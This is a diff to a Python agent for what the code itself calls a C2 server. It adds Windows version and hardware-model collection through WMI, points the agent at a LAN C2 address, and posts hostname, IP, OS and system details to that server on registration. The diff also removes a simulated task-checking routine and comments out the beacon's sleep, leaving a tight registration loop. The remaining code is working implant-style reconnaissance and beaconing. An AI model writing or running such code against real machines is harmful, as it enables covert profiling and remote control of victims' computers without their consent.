@@ -5,9 +5,12 @@ import uuid
 import platform
 import psutil
 from datetime import datetime, timedelta
+import subprocess
+import win32com.client
+import os
 
 # URL of the C2 server
-SERVER_URL = "http://127.0.0.1:5000"
+SERVER_URL = "http://192.168.31.132:5000"
 
 # Generate a unique agent ID
 AGENT_ID = str(uuid.uuid4())
@@ -38,6 +41,45 @@ def format_uptime(seconds):
     minutes, seconds = divmod(rem, 60)
     return f"{int(days)} days, {int(hours)} hours, {int(minutes)} minutes, {int(seconds)} seconds"
 
+def get_windows_version():
+    version = platform.version()  # Kernel version
+    release = platform.release()  # General release (e.g., 10)
+    build = os.sys.getwindowsversion().build  # Build number
+
+    # Map of Windows builds to versions
+    windows_version_map = {
+        "XP": (5, 1),
+        "Vista": (6, 0),
+        "7": (6, 1),
+        "8": (6, 2),
+        "8.1": (6, 3),
+        "10": (10, 0),
+        "11": (10, 0),  # Distinguish by build number >= 22000
+    }
+
+    # Detect major and minor versions
+    major = os.sys.getwindowsversion().major
+    minor = os.sys.getwindowsversion().minor
+
+    # Find the version name
+    for name, (ver_major, ver_minor) in windows_version_map.items():
+        if (major, minor) == (ver_major, ver_minor):
+            if name == "10" and build >= 22000:
+                return f"Windows 11 (Version: {version}, Build: {build})"
+            return f"Windows {name} (Version: {version}, Build: {build})"
+
+    # Fallback if version isn't in the map
+    return f"Windows {release} (Version: {version}, Build: {build})"
+
+def get_computer_model_with_com():
+    try:
+        objWMI = win32com.client.GetObject("winmgmts:\\\\.\\root\\cimv2")
+        systems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
+        for system in systems:
+            return system.Model
+    except Exception as e:
+        return f"Error: {e}"
+
 def get_system_info():
     """Collect detailed system information."""
     system_info = {
@@ -48,6 +90,7 @@ def get_system_info():
         'architecture': platform.architecture()[0],
         'uptime': format_uptime(time.time() - psutil.boot_time()),  # Convert to readable uptime
         'kernel_version': platform.release(),
+        'model': get_computer_model_with_com(),
     }
 
     # CPU info
@@ -110,7 +153,7 @@ def register_with_server():
             "agent_id": AGENT_ID,
             "ip": get_active_ip(),
             "hostname": socket.gethostname(),
-            "os": platform.system(),
+            "os": get_windows_version(),
             "system_info": get_system_info()  # Send system info along with registration
         }
         response = requests.post(f"{SERVER_URL}/register", json=data)
@@ -121,28 +164,6 @@ def register_with_server():
     except Exception as e:
         print("Registration error:", e)
 
-def check_for_tasks():
-    """Check for tasks from the C2 server and execute them."""
-    try:
-        response = requests.get(f"{SERVER_URL}/tasks/{AGENT_ID}")
-        if response.status_code == 200:
-            tasks = response.json()
-            if isinstance(tasks, list):
-                if tasks:
-                    for task in tasks:
-                        print(f"Executing task: {task['task']}")
-                        # Simulate task execution
-                        time.sleep(2)
-                        print(f"Task '{task['task']}' completed.")
-                else:
-                    print("No tasks to execute.")
-            else:
-                print("Unexpected task format received.")
-        else:
-            print(f"Failed to fetch tasks: {response.status_code}")
-    except Exception as e:
-        print("Error checking tasks:", e)
-
 def main():
     while True:
         try:
@@ -150,11 +171,11 @@ def main():
             register_with_server()
 
             # Check for tasks every 30 seconds
-            check_for_tasks()
+            # check_for_tasks()
         except Exception as e:
             print("Error:", e)
 
-        time.sleep(30)  # Send heartbeat every 30 seconds
+        #time.sleep(30)  # Send heartbeat every 30 seconds
 
 if __name__ == "__main__":
     main()
